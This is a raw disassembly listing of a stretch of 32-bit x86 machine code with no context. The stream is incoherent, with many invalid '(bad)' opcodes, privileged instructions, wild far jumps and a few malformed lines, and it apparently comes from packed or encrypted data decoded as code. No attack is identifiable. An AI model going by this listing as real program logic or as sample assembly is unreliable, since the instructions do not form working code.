  4142c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142c8:	dec    edi
  4142c9:	daa    
  4142ca:	sbb    eax,0x330f4652
  4142cf:	xchg   esi,eax
  4142d0:	pop    es
  4142d1:	mov    ebp,ebx
  4142d3:	xchg   DWORD PTR [edx-0x10],ebx
  4142d6:	icebp  
  4142d7:	ins    DWORD PTR es:[edi],dx
  4142d8:	dec    edi
  4142d9:	mov    ecx,0x225dcfe7
  4142de:	pusha  
  4142df:	push   es
  4142e0:	add    eax,0x6a35f381
  4142e5:	mov    al,ds:0x525e834d
  4142ea:	pop    eax
  4142eb:	ror    BYTE PTR [edi-0x65],1
  4142ee:	dec    edi
  4142ef:	push   ds
  4142f0:	and    eax,0xec36504b
  4142f5:	das    
  4142f6:	lods   eax,DWORD PTR ds:[esi]
  4142f7:	in     eax,0xf
  4142f9:	pop    ss
  4142fa:	outs   dx,BYTE PTR ds:[esi]
  4142fb:	mov    bl,0xb
  4142fd:	(bad)  
  4142fe:	dec    DWORD PTR [ebp+0x10d7895]
  414304:	mov    edi,ss
  414306:	lea    esp,[esi-0x6a]
  414309:	out    dx,eax
  41430a:	mov    dh,0x7d
  41430c:	rcl    BYTE PTR [ebp+0x6eac8ba0],1
  414312:	mov    ch,0x5b
  414314:	and    DWORD PTR [ebp+0x2db07217],esp
  41431a:	jmp    0x414339
  41431c:	cmp    eax,0x9a5d051b
  414321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414322:	xlat   BYTE PTR ds:[ebx]
  414323:	pop    edi
  414324:	ror    BYTE PTR [esp+edi*1-0x1f],1
  414328:	ds cdq 
  41432a:	lock and al,0xe2
  41432d:	adc    eax,0x4669540e
  414332:	mov    ecx,0xd66aa73d
  414337:	stos   BYTE PTR es:[edi],al
  414338:	mov    esi,0xa5c5ebcf
  41433d:	fimul  WORD PTR [edi]
  41433f:	call   0x2a0e:0x264d7573
  414346:	in     al,0x5f
  414348:	dec    eax
  414349:	scas   eax,DWORD PTR es:[edi]
  41434a:	xor    dl,BYTE PTR [eax+eax*8]
  41434d:	shl    DWORD PTR [ebx-0xdefc0f9],1
  414353:	push   esp
  414354:	fcomp  DWORD PTR [edi+0x18]
  414357:	push   0x6f1f5b35
  41435c:	enter  0xcadc,0x2d
  414360:	adc    DWORD PTR [edx-0x67],esi
  414363:	mov    ah,0x3b
  414365:	(bad)  
  414366:	into   
  414367:	shl    bl,1
  414369:	data16 jmp 0x41435d
  41436c:	cwde   
  41436d:	adc    DWORD PTR ds:0x56c8ee64,edi
  414373:	mov    edi,0xba05d4d1
  414378:	cmp    al,0x20
  41437a:	and    BYTE PTR [ebx-0x887e0fb],al
  414380:	push   esi
  414381:	cli    
  414382:	js     0x414341
  414384:	mov    edx,0x77442168
  414389:	dec    esp
  41438a:	xchg   ebp,eax
  41438b:	rcl    DWORD PTR [ebx-0x51676455],1
  414391:	jns    0x41436c
  414393:	adc    al,0x9c
  414395:	push   ss
  414396:	cdq    
  414397:	add    eax,0x1f419db3
  41439c:	push   esi
  41439d:	mov    BYTE PTR [esp+esi*1],dh
  4143a0:	jns    0x41433a
  4143a2:	xlat   BYTE PTR ds:[ebx]
  4143a3:	xchg   edx,eax
  4143a4:	lea    edx,[ebp+0x4243088e]
  4143aa:	sbb    eax,0x2d4ed120
  4143af:	dec    ebp
  4143b0:	popa   
  4143b1:	stc    
  4143b2:	or     edx,DWORD PTR [edx+0x48]
  4143b5:	mov    dl,0x53
  4143b7:	mov    cl,0x4d
  4143b9:	pop    esi
  4143ba:	mov    ah,0xa7
  4143bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143bd:	jo     0x41435b
  4143bf:	sub    DWORD PTR [ebx],ebp
  4143c1:	and    esi,eax
  4143c3:	lods   al,BYTE PTR ds:[esi]
  4143c4:	push   ss
  4143c5:	cmp    ecx,DWORD PTR [esi]
  4143c7:	gs mov edi,0x504b8687
  4143cd:	xor    bh,BYTE PTR [edi]
  4143cf:	(bad)  
  4143d0:	jbe    0x414427
  4143d2:	sahf   
  4143d3:	dec    ecx
  4143d5:	mov    DWORD PTR [edi-0x6d900fa0],ecx
  4143db:	call   0xacde1c89
  4143e0:	pop    ss
  4143e1:	or     esp,eax
  4143e3:	mov    ds:0x313923ec,al
  4143e8:	fadd   st,st(1)
  4143ea:	adc    al,0xf2
  4143ec:	aad    0xa5
  4143ee:	push   ss
  4143ef:	inc    edx
  4143f0:	xor    al,0x61
  4143f2:	and    BYTE PTR [esi+0x7baa0abe],bl
  4143f8:	enter  0xeac3,0x5c
  4143fc:	sbb    BYTE PTR [esi],dl
  4143fe:	sub    DWORD PTR [esi-0x1217a494],ecx
  414404:	push   ecx
  414405:	cmc    
  414406:	jo     0x414472
  414408:	mov    edx,DWORD PTR [ebx-0x7b8609ed]
  41440e:	pop    esp
  41440f:	mov    dl,0x6f
  414411:	cld    
  414412:	pop    ebx
  414413:	out    0x3d,eax
  414415:	cmc    
  414416:	dec    ebp
  414417:	loop   0x414444
  414419:	into   
  41441a:	adc    DWORD PTR [edx+0x5],ecx
  41441d:	inc    esp
  41441e:	(bad)  
  41441f:	push   ds
  414420:	add    edi,DWORD PTR cs:[edi+0x66]
  414424:	ins    BYTE PTR es:[edi],dx
  414425:	jg     0x414499
  414427:	xchg   BYTE PTR [ebp-0x40],bl
  41442a:	push   edx
  41442b:	test   al,0xd1
  41442d:	push   ebp
  41442e:	or     al,0xcb
  414430:	sub    al,0x31
  414432:	pop    ss
  414433:	hlt    
  414434:	imul   ebx,DWORD PTR [ebx+0x28],0x5d801bea
  41443b:	adc    al,0x2f
  41443d:	aaa    
  41443e:	popf   
  41443f:	push   0x58208b44
  414444:	test   DWORD PTR [ebx+0x54b6e94f],ebx
  41444a:	aas    
  41444b:	loopne 0x414407
  41444d:	retf   
  41444e:	test   DWORD PTR [edx],0x5a25c140
  414454:	jne    0x414413
  414456:	(bad)  
  414457:	loope  0x414466
  414459:	daa    
  41445a:	ret    0xdbbe
  41445d:	loop   0x4144cb
  41445f:	jmp    0xe0e6:0x38a6f26a
  414466:	cmp    BYTE PTR es:[edx-0x6cd207e9],0xca
  41446e:	mov    al,ds:0xa0311c56
  414473:	lea    edx,[eax+ecx*4-0x5]
  414477:	push   ecx
  414478:	and    eax,0x5838d0ee
  41447d:	hlt    
  41447e:	imul   ebp
  414480:	out    0x66,al
  414482:	test   DWORD PTR [edx+0x3fa03fa7],edx
  414488:	inc    ebx
  414489:	sahf   
  41448a:	jg     0x41445a
  41448c:	pop    eax
  41448d:	adc    dl,BYTE PTR [eax]
  41448f:	(bad)  
  414490:	cmp    DWORD PTR [esi+0x491ecb27],edi
  414496:	pop    eax
  414497:	dec    ebp
  414498:	outs   dx,DWORD PTR ds:[esi]
  414499:	push   edx
  41449a:	mov    BYTE PTR ds:0x387a9419,bl
  4144a0:	sbb    BYTE PTR [ecx-0x1071aabb],cl
  4144a6:	inc    esp
  4144a7:	push   ebx
  4144a8:	outs   dx,DWORD PTR ds:[esi]
  4144a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144aa:	loope  0x41451e
  4144ac:	and    ah,ch
  4144ae:	div    dl
  4144b0:	push   ecx
  4144b1:	or     eax,0x76922214
  4144b6:	addr16 push edi
  4144b8:	fimul  DWORD PTR [ebx+0x777ef9ec]
  4144be:	mul    DWORD PTR ds:[esi+0x3aa9c9bc]
  4144c5:	std    
  4144c6:	and    DWORD PTR ds:0xb25e94b7,0xffffff9a
  4144cd:	cli    
  4144ce:	arpl   WORD PTR [ebp-0x5cb2ee1f],cx
  4144d4:	sub    BYTE PTR ds:0x17203d8e,0xb6
  4144db:	es cmp eax,0x2dcf316e
  4144e1:	iret   
  4144e2:	sbb    al,0xe1
  4144e4:	jmp    0x832f:0xed2af2fc
  4144eb:	inc    edi
  4144ec:	dec    eax
  4144ed:	fdiv   QWORD PTR [esi]
  4144ef:	pop    ebp
  4144f0:	sub    dl,dh
  4144f2:	sub    eax,0x77a24354
  4144f7:	sub    DWORD PTR [ebx*1+0x3746c7bd],0xf359ddfe
  414502:	pop    ss
  414503:	sbb    edx,DWORD PTR [edx+0x17]
  414506:	jl     0x4144ae
  414508:	in     eax,dx
  414509:	add    al,ch
  41450b:	mov    ecx,0x860ae3c6
  414510:	jmp    0x1d55113f
  414515:	mov    dh,0xe5
  414517:	leave  
  414518:	imul   ebp,DWORD PTR [edi+0x63],0xe56400e3
  41451f:	inc    edx
  414520:	xchg   BYTE PTR ds:[esi+ecx*8-0x60aa7ed5],ah
  414528:	mov    ch,0xbb
  41452a:	fdivr  QWORD PTR [edx+0x53]
  41452d:	sbb    al,BYTE PTR [ecx+0x38]
  414530:	fsub   DWORD PTR [ebp+0x11e4d41e]
  414536:	aam    0x77
  414538:	mov    eax,0x4e28549c
  41453d:	(bad)  
  41453e:	jb     0x4144e2
  414540:	mov    eax,0xc1843a6b
  414545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414546:	xlat   BYTE PTR ds:[ebx]
  414547:	jo     0x414501
  414549:	fwait
  41454a:	lods   eax,DWORD PTR ds:[esi]
  41454b:	mov    WORD PTR [ecx],fs
  41454d:	or     DWORD PTR [ecx-0xae3e644],ecx
  414553:	inc    esp
  414554:	cmp    BYTE PTR [eax+ebx*1+0x5da7d2b0],bl
  41455b:	pop    esp
  41455c:	test   eax,0x980a7ad6
  414561:	es push ebx
  414563:	jg     0x414522
  414565:	(bad)  cs:[eax-0x2b]
  414569:	jle    0x414501
  41456b:	fwait
  41456c:	test   ecx,0xf0f5bd77
  414572:	(bad)  
  414573:	test   eax,0xdd9b301f
  414578:	repz push ecx
  41457a:	test   al,0x30
  41457c:	sub    eax,0xf6903b47
  414581:	dec    esi
  414582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414583:	jp     0x414580
  414585:	imul   eax,DWORD PTR [edi+0x49],0xffffff9a
  414589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41458a:	xchg   edi,eax
  41458b:	add    al,0x32
  41458d:	xchg   esp,eax
  41458e:	mov    dl,0xfa
  414590:	pop    edx
  414591:	(bad)  [edx]
  414593:	jecxz  0x414524
  414595:	push   0x2a226bdc
  41459a:	mov    ecx,0xd68c1fc1
  41459f:	dec    esp
  4145a0:	rep ins BYTE PTR es:[edi],dx
  4145a2:	cli    
  4145a3:	lea    eax,[edi]
  4145a5:	mov    ch,0x83
  4145a7:	cmp    ch,BYTE PTR [edx+ebp*8-0x24]
  4145ab:	mov    edx,0xf841deec
  4145b0:	(bad)  
  4145b1:	mov    cl,ch
  4145b3:	sahf   
  4145b4:	aam    0x8
  4145b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145b7:	rcl    DWORD PTR [ebx+0x4f],cl
  4145ba:	and    bl,BYTE PTR [eax+0x32db55f7]
  4145c0:	mov    ecx,0x5052f7c0
  4145c5:	hlt    
  4145c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145c7:	std    
  4145c8:	lahf   
  4145c9:	or     esi,edx
  4145cb:	fdivr  QWORD PTR [edx+0x61]
  4145ce:	cld    
  4145cf:	mov    edi,0xbef09612
  4145d4:	pop    edi
  4145d5:	or     DWORD PTR [ecx],ebp
  4145d7:	(bad)  
  4145d8:	scas   al,BYTE PTR es:[edi]
  4145d9:	xor    al,0xf
  4145db:	ja     0x4145b6
  4145dd:	push   0x69a0ab15
  4145e2:	pop    esp
  4145e3:	std    
  4145e4:	aaa    
  4145e5:	sti    
  4145e6:	ja     0x41458c
  4145e8:	and    eax,0xbc0dfa70
  4145ed:	in     eax,0xeb
  4145ef:	js     0x414577
  4145f1:	pop    eax
  4145f2:	pushf  
  4145f3:	int    0x98
  4145f5:	and    ah,BYTE PTR [edi+0x5d]
  4145f8:	pcmpgtb mm5,QWORD PTR [esi+edx*2+0x2a]
  4145fd:	xchg   edi,eax
  4145fe:	sbb    eax,0x34f54c82
  414603:	pop    ecx
  414604:	mov    ch,0x2f
  414606:	jle    0x4145ab
  414608:	jo     0x4145fb
  41460a:	push   ebp
  41460b:	adc    BYTE PTR [ebp-0x47],ah
  41460e:	into   
  41460f:	cmp    ah,BYTE PTR [ebp-0x74530c1]
  414615:	and    eax,0x654b1363
  41461a:	fucom  st(2)
  41461c:	mov    bh,0x36
  41461e:	rcl    BYTE PTR [edi+ecx*4],cl
  414621:	in     al,dx
  414622:	imul   ebp,DWORD PTR [eax-0x99826eb],0x32c4b03b
  41462c:	xchg   edi,eax
  41462d:	mov    ah,0x6e
  41462f:	add    eax,0x14459e6
  414634:	mov    gs:0xc182f15d,al
  41463a:	adc    BYTE PTR [esi+0x5a38080d],cl
  414640:	clc    
  414641:	dec    ebx
  414642:	jmp    0xacbe:0xc8e66f1c
  414649:	repz xlat BYTE PTR ds:[ebx]
  41464b:	cmp    eax,0x4d241937
  414650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414651:	mov    fs,ecx
  414653:	jp     0x4145f0
  414655:	arpl   WORD PTR [ebx-0x12e71bd0],bx
  41465b:	loope  0x414653
  41465d:	push   ebp
  41465e:	cld    
  41465f:	sub    DWORD PTR [eax+0x78],eax
  414662:	dec    edx
  414663:	or     eax,0xcac7675e
  414668:	fs (bad) 
  41466a:	dec    esi
  41466b:	push   ds
  41466c:	jbe    0x414672
  41466e:	shl    DWORD PTR [edx+ebx*2+0x1a],0x2f
  414673:	or     ch,bh
  414675:	dec    ebp
  414676:	mov    eax,eax
  414678:	(bad)  
  414679:	call   ecx
  41467b:	stos   DWORD PTR es:[edi],eax
  41467c:	jl     0x4146e9
  41467e:	push   ss
  41467f:	ds xor edi,eax
  414682:	dec    eax
  414683:	int3   
  414684:	xor    al,0xb6
  414686:	and    DWORD PTR [esp+edx*4-0x3c],esp
  41468a:	mov    al,ds:0x5eb691f5
  41468f:	xor    eax,0x6c5e2eeb
  414694:	dec    esp
  414695:	sbb    DWORD PTR [eax],ebp
  414697:	or     al,0xd5
  414699:	xchg   edi,eax
  41469a:	test   eax,0x25032d24
  41469f:	aaa    
  4146a0:	cwde   
  4146a1:	ins    DWORD PTR es:[edi],dx
  4146a2:	sbb    BYTE PTR [eax],al
  4146a4:	mov    cl,0x90
  4146a6:	rol    DWORD PTR [edx],0x3e
  4146a9:	scas   al,BYTE PTR es:[edi]
  4146aa:	dec    ebx
  4146ab:	mov    al,0x64
  4146ad:	pop    ebx
  4146ae:	mov    bh,0xea
  4146b0:	push   0xbf4b8e70
  4146b5:	test   eax,0x27485966
  4146ba:	mov    ss,edi
  4146bc:	repnz outs dx,DWORD PTR ds:[esi]
  4146be:	loop   0x414645
  4146c0:	rol    edx,0xf9
  4146c3:	mov    eax,ds:0x5b352725
  4146c8:	aaa    
  4146c9:	push   eax
  4146ca:	xchg   edi,eax
  4146cb:	loop   0x4146b8
  4146cd:	iret   
  4146ce:	test   DWORD PTR [ebp-0x7c669cd8],ebp
  4146d4:	inc    ecx
  4146d5:	out    dx,al
  4146d6:	fwait
  4146d7:	out    dx,al
  4146d8:	and    edx,ecx
  4146da:	mov    BYTE PTR [ebx+0x6c],ah
  4146dd:	dec    esi
  4146de:	int3   
  4146df:	xor    eax,0x7324c3ae
  4146e4:	xor    BYTE PTR [ecx-0x1],bh
  4146e7:	fnsave [ecx+0x3a]
  4146ea:	(bad)  
  4146eb:	mov    ebp,0xdd3a876
  4146f0:	inc    esp
  4146f1:	xchg   ebp,eax
  4146f2:	push   edx
  4146f3:	mov    DWORD PTR [ecx],esp
  4146f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146f6:	iret   
  4146f7:	sar    al,0xb8
  4146fa:	xor    dl,al
  4146fc:	cmp    eax,0x36711d34
  414701:	pop    edx
  414702:	sbb    dh,BYTE PTR [esi-0x5a]
  414705:	das    
  414706:	push   ecx
  414707:	lds    esp,FWORD PTR [ebx+0x18a1df22]
  41470d:	pop    edi
  41470e:	sub    ah,cl
  414710:	aaa    
  414711:	cmp    al,0x57
  414713:	add    ebp,DWORD PTR [edi]
  414715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414716:	loop   0x41473c
  414718:	scas   eax,DWORD PTR es:[edi]
  414719:	lock inc edx
  41471b:	(bad)  
  41471d:	sub    al,0x27
  41471f:	sbb    esp,ecx
  414721:	xrelease xchg DWORD PTR fs:[eax-0x60801548],esi
  414729:	not    BYTE PTR [ebp+0x3e122aa2]
  41472f:	jg     0x4147a5
  414731:	push   cs
  414732:	sub    ebp,esi
  414734:	add    bp,WORD PTR ds:0x355b8a84
  41473b:	push   ss
  41473c:	call   0x3391:0xb317810f
  414743:	adc    DWORD PTR fs:[esi-0x4859e334],ebp
  41474a:	inc    ebp
  41474b:	addr16 daa 
  41474d:	bound  ebx,QWORD PTR [ecx-0x4f1561be]
  414753:	sub    edx,DWORD PTR [edi]
  414755:	sbb    ebx,edx
  414757:	inc    BYTE PTR [eax+0x5231fad3]
  41475d:	cdq    
  41475e:	cli    
  41475f:	or     al,0x90
  414761:	mov    ?,ecx
  414763:	mov    edi,0x2d0c0632
  414768:	sar    BYTE PTR [esi+0x5efefc3f],0xdc
  41476f:	imul   eax,DWORD PTR [ecx-0x34e02b38],0xb9aee39e
  414779:	push   ecx
  41477a:	enter  0x131a,0x38
  41477e:	pop    esi
  41477f:	out    dx,al
  414780:	shl    BYTE PTR [edi+eax*2],cl
  414783:	mov    dl,0x3c
  414785:	cli    
  414786:	lock shl dl,0xf1
  41478a:	retf   
  41478b:	inc    edx
  41478c:	and    DWORD PTR [ebx+0x3b],edi
  41478f:	imul   ecx,DWORD PTR gs:0x35123aca,0xffffffc4
  414797:	push   ecx
  414798:	xchg   ebp,eax
  414799:	push   ebp
  41479a:	in     eax,dx
  41479b:	shl    dh,cl
  41479d:	sbb    DWORD PTR [ebp-0x628413b2],esi
  4147a3:	pop    ss
  4147a4:	das    
  4147a5:	daa    
  4147a6:	push   ds
  4147a7:	push   esp
  4147a8:	rol    DWORD PTR [ecx-0x5f],cl
  4147ab:	mov    edx,0xeddd2672
  4147b0:	mov    esi,0x96ed3885
  4147b5:	dec    ebx
  4147b6:	pop    ebp
  4147b7:	shl    BYTE PTR [edx+0x36ac43f],cl
  4147bd:	out    dx,eax
  4147be:	(bad)  
  4147bf:	int3   
  4147c0:	sub    ch,BYTE PTR [ecx]
  4147c2:	inc    esp
  4147c3:	cld    
  4147c4:	inc    edx
  4147c5:	hlt    
  4147c6:	xor    BYTE PTR [edi],ch
  4147c8:	cmc    
  4147c9:	call   0x204b5326
  4147ce:	mov    ds:0x544ae7e4,al
  4147d3:	pop    esp
  4147d4:	mov    ebx,0x3b1f7db3
  4147d9:	mov    WORD PTR [ecx+0x1fc91aed],cs
  4147df:	lods   al,BYTE PTR ds:[esi]
  4147e0:	and    ah,bh
  4147e2:	es dec esp
  4147e4:	clc    
  4147e5:	dec    eax
  4147e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e7:	sbb    BYTE PTR [ebx-0x1e],dh
  4147ea:	je     0x4147b0
  4147ec:	push   eax
  4147ed:	cmp    BYTE PTR [ebx+0x4],bh
  4147f0:	sbb    eax,DWORD PTR [ecx-0x73]
  4147f3:	jg     0x4147d0
  4147f5:	repz int 0xe
  4147f8:	xchg   BYTE PTR [edx+0x36ab4cdd],bh
  4147fe:	out    dx,eax
  4147ff:	movd   mm2,DWORD PTR [ebp-0x7c23ce13]
  414806:	adc    al,0xf1
  414808:	jl     0x4147bf
  41480a:	add    DWORD PTR [eax],eax
  41480c:	and    al,0xb5
  41480e:	ret    0x2e9c
  414811:	xlat   BYTE PTR ds:[ebx]
  414812:	push   eax
  414813:	mov    dh,0x77
  414815:	pop    es
  414816:	mov    eax,ds:0x37d510a8
  41481b:	sub    bh,BYTE PTR [edi-0x1ea5b467]
  414821:	lea    esp,[ebp+0x6c392210]
  414827:	xchg   edi,eax
  414828:	dec    eax
  414829:	les    esp,FWORD PTR [esi]
  41482b:	inc    ecx
  41482c:	jnp    0x41484b
  41482e:	cli    
  41482f:	rcr    dh,1
  414831:	pop    ds
  414832:	sub    DWORD PTR [eax],ebx
  414834:	clc    
  414835:	js     0x414827
  414837:	repz push esp
  414839:	pop    edx
  41483a:	icebp  
  41483b:	cmp    eax,0x84083fc2
  414840:	add    DWORD PTR [esi+0x17],edx
  414843:	cmc    
  414844:	pop    ecx
  414845:	push   edx
  414846:	addr16 pop eax
  414848:	sub    BYTE PTR [esp+eiz*2-0x18],al
  41484c:	fcom   DWORD PTR [ebx-0x5c]
  41484f:	cmp    eax,0x497d3376
  414854:	(bad)  
  414855:	setnp  BYTE PTR [ecx+0x3a416b87]
  41485c:	cmp    edx,esi
  41485e:	imul   ebp,DWORD PTR [eax-0x399404a7],0xffffffc3
  414865:	jge    0x4148cb
  414867:	int3   
  414868:	das    
  414869:	loope  0x41488f
  41486b:	(bad)  
  41486c:	or     eax,0xf84054c5
  414871:	call   0xe172:0x924f8e96
  414878:	sti    
  414879:	add    DWORD PTR [esi+esi*8+0x3d58de16],esp
  414880:	sub    bh,BYTE PTR [esi+0x7aad3320]
  414886:	out    0xd2,al
  414888:	pop    es
  414889:	xor    ch,cl
  41488b:	push   eax
  41488c:	pop    esi
  41488d:	fild   QWORD PTR [edx]
  41488f:	scas   al,BYTE PTR es:[edi]
  414890:	ja     0x414838
  414892:	retf   0x5c8c
  414895:	sub    eax,0x6ce53cb3
  41489a:	cmp    esi,DWORD PTR [ebp-0x5fbd1a0d]
  4148a0:	aad    0xd0
  4148a2:	rcl    ebp,0xf1
  4148a5:	cmp    BYTE PTR [ebp+0x4b],0xaa
  4148a9:	dec    edi
  4148aa:	in     eax,0xc7
  4148ac:	jmp    0x7f3:0x943c4e0f
  4148b3:	(bad)  
  4148b4:	mov    esp,0x263d6fac
  4148b9:	into   
  4148ba:	jmp    0x41487b
  4148bc:	or     eax,0xeabbc1cd
  4148c1:	xchg   esp,eax
  4148c2:	and    eax,0x41429b68
  4148c7:	pushf  
  4148c8:	sbb    DWORD PTR [ecx+0x58cfedf3],ebp
  4148ce:	add    eax,ecx
  4148d0:	in     eax,dx
  4148d1:	push   ebp
  4148d2:	push   eax
  4148d3:	(bad)  
  4148d4:	imul   BYTE PTR [ebp+0x56]
  4148d7:	jmp    0x4cb5:0xfe842d38
  4148de:	jmp    0xa31cfb0b
  4148e3:	or     al,0x78
  4148e5:	cmp    esp,DWORD PTR [edx]
  4148e7:	int    0xc9
  4148e9:	inc    ebx
  4148ea:	inc    eax
  4148eb:	gs cdq 
  4148ed:	into   
  4148ee:	pop    edi
  4148ef:	mov    ebx,ecx
  4148f1:	(bad)  
  4148f3:	push   esi
  4148f4:	lds    edi,FWORD PTR [esi+ebx*2]
  4148f7:	jg     0x414952
  4148f9:	push   fs
  4148fb:	clc    
  4148fc:	sbb    BYTE PTR [eax+0x7b],dl
  4148ff:	data16 daa 
  414901:	jge    0x4148a4
  414903:	add    DWORD PTR [edx+edx*8-0x85cd095],ebp
  41490a:	xor    dh,BYTE PTR [edi]
  41490c:	push   0xffffffd9
  41490e:	push   ecx
  41490f:	or     al,0x85
  414911:	add    ebx,DWORD PTR ds:0xf19d51da
  414917:	popa   
  414918:	jae    0x41496e
  41491a:	xchg   esp,eax
  41491b:	jbe    0x414977
  41491d:	pop    ecx
  41491e:	gs enter 0xcc2a,0x7d
  414923:	(bad)  
  414924:	mov    dh,0x5b
  414926:	(bad)  
  414927:	cli    
  414928:	test   al,0xe8
  41492a:	push   esp
  41492b:	sbb    ch,al
  41492d:	inc    edi
  41492e:	out    dx,eax
  41492f:	push   ebp
  414930:	mov    ds:0xbd878ff1,al
  414935:	adc    DWORD PTR [esi-0x45d85a33],ebx
  41493b:	nop
  41493c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41493d:	out    0xa9,al
  41493f:	xchg   esp,eax
  414940:	dec    edi
  414941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414942:	xchg   edi,eax
  414943:	pop    ebp
  414944:	mov    dh,0x98
  414946:	cmp    edi,eax
  414948:	sahf   
  414949:	cmc    
  41494a:	aaa    
  41494b:	shl    BYTE PTR [ecx],cl
  41494d:	shr    ebp,1
  41494f:	push   0xffffffb9
  414951:	shl    DWORD PTR [esi-0x4c],cl
  414954:	call   0xa7636b74
  414959:	push   cs
  41495a:	cld    
  41495b:	or     ebp,DWORD PTR [eax]
  41495d:	sbb    BYTE PTR [edx+eiz*8+0x3e],cl
  414961:	add    eax,0x38606e69
  414966:	fdivrp st(0),st
  414968:	xchg   esp,eax
  414969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41496a:	popa   
  41496b:	fs push ds
  41496d:	dec    esp
  41496e:	sub    eax,DWORD PTR [esi-0x72a31299]
  414974:	push   esp
  414975:	xor    ecx,ebx
  414977:	pop    es
  414978:	inc    esp
  414979:	(bad)  
  41497a:	ins    BYTE PTR es:[edi],dx
  41497b:	int    0xc0
  41497d:	mov    dh,0x2a
  41497f:	cdq    
  414980:	pop    ecx
  414981:	cmp    eax,0xbef261dc
  414986:	leave  
  414987:	sub    bl,dh
  414989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41498a:	or     BYTE PTR [ebx+0x6721c56f],dl
  414990:	dec    ecx
  414991:	xchg   ecx,eax
  414992:	jmp    0x965d69a0
  414997:	out    dx,al
  414998:	mov    esi,DWORD PTR [edi+eax*1]
  41499b:	jmp    0x4149e3
  41499d:	sbb    ebp,DWORD PTR [ebx+esi*1-0x52]
  4149a1:	repz bound esi,QWORD PTR [ebx-0x490118fb]
  4149a8:	dec    eax
  4149a9:	pop    esp
  4149aa:	scas   al,BYTE PTR es:[edi]
  4149ab:	pushf  
  4149ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149ad:	add    al,BYTE PTR [ebp+0x32]
  4149b0:	int    0x72
  4149b2:	xchg   esp,eax
  4149b3:	int3   
  4149b4:	xchg   ebx,eax
  4149b5:	push   ebp
  4149b6:	mov    eax,DWORD PTR [ecx+0x7412d5b1]
  4149bc:	loope  0x41498b
  4149be:	mov    ecx,0x6607f042
  4149c3:	adc    al,0xee
  4149c5:	fwait
  4149c6:	imul   esi,DWORD PTR [ebp+0x143c0c59],0xffffffa7
  4149cd:	cmp    DWORD PTR [ebp-0x3c989aaa],esi
  4149d3:	ror    bl,cl
  4149d5:	(bad)  
  4149d7:	iret   
  4149d8:	dec    ebx
  4149da:	xchg   esi,eax
  4149db:	jl     0x414a4c
  4149dd:	adc    BYTE PTR [ebp+0x3b],cl
  4149e0:	pop    esp
  4149e1:	adc    eax,DWORD PTR [ecx-0x4f]
  4149e4:	xor    eax,0x8293a0bc
  4149e9:	push   esi
  4149ea:	push   eax
  4149eb:	sbb    DWORD PTR [edx-0x13],ecx
  4149ee:	pop    edi
  4149ef:	ret    
  4149f0:	fs repz and dl,0xa1
  4149f5:	ins    BYTE PTR es:[edi],dx
  4149f6:	and    BYTE PTR [ecx-0x75],0xd7
  4149fa:	je     0x414a5b
  4149fc:	inc    esp
  4149fd:	xor    ebx,DWORD PTR [esi+0x28034023]
  414a03:	dec    edx
  414a04:	inc    ebp
  414a05:	in     eax,0xfc
  414a07:	jmp    0x9aed6db3
  414a0c:	cmp    bl,BYTE PTR [eax]
  414a0e:	fdiv   DWORD PTR [edi+eax*4-0x2f42d730]
  414a15:	mov    al,0x91
  414a17:	jne    0x414a2c
  414a19:	ja     0x414a87
  414a1b:	ins    DWORD PTR es:[edi],dx
  414a1c:	dec    ebx
  414a1d:	enter  0xe4dc,0x29
  414a21:	inc    eax
  414a22:	(bad)  
  414a23:	fldenv [edx]
  414a25:	and    DWORD PTR [ebx],esi
  414a27:	xchg   edx,eax
  414a28:	push   ds
  414a29:	pop    ebx
  414a2a:	dec    ecx
  414a2b:	fadd   QWORD PTR [edi-0x7153a304]
  414a31:	pop    edx
  414a32:	sub    DWORD PTR [esi],eax
  414a34:	mov    esp,0x98865950
  414a39:	int3   
  414a3a:	pop    edi
  414a3b:	mov    ecx,0xf70ca8d8
  414a40:	imul   eax,DWORD PTR [esi-0x1c],0x186c4834
  414a47:	out    dx,al
  414a48:	xchg   esp,eax
  414a49:	test   eax,0x20ccb601
  414a4e:	or     al,0x4d
  414a50:	outs   dx,DWORD PTR ds:[esi]
  414a51:	(bad)  
  414a52:	xchg   esi,eax
  414a53:	cs mov ebx,0xb2053fc1
  414a59:	ss mov dl,0x12
  414a5c:	inc    esp
  414a5d:	mov    ebp,0xb16b428d
  414a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a63:	lock mov ds:0x4448aa8f,al
  414a69:	sbb    BYTE PTR [edx-0x29e1b803],0xdf
  414a70:	es ja  0x414a96
  414a73:	mov    ecx,0x418256af
  414a78:	fiadd  DWORD PTR [edi-0x56406a4]
  414a7e:	mov    ch,0xba
  414a80:	jge    0x414a2a
  414a82:	pop    ss
  414a83:	mov    dh,0xbd
  414a85:	or     esi,esi
  414a87:	into   
  414a88:	cmp    DWORD PTR [ebx],edx
  414a8a:	mov    ds:0xce4a2a2c,eax
  414a8f:	dec    esi
  414a90:	adc    al,bh
  414a92:	nop
  414a93:	jbe    0x414a2b
  414a95:	xor    ch,ch
  414a97:	das    
  414a98:	jne    0x414ac8
  414a9a:	sub    DWORD PTR [eax+0xcc4df08],0x4d12cf71
  414aa4:	fcom   DWORD PTR es:[ecx]
  414aa7:	mov    edx,db3
  414aaa:	pop    eax
  414aab:	idiv   DWORD PTR ds:0xdf47f70f
  414ab1:	iret   
  414ab2:	repz sbb ah,BYTE PTR [eax-0x2fbdc478]
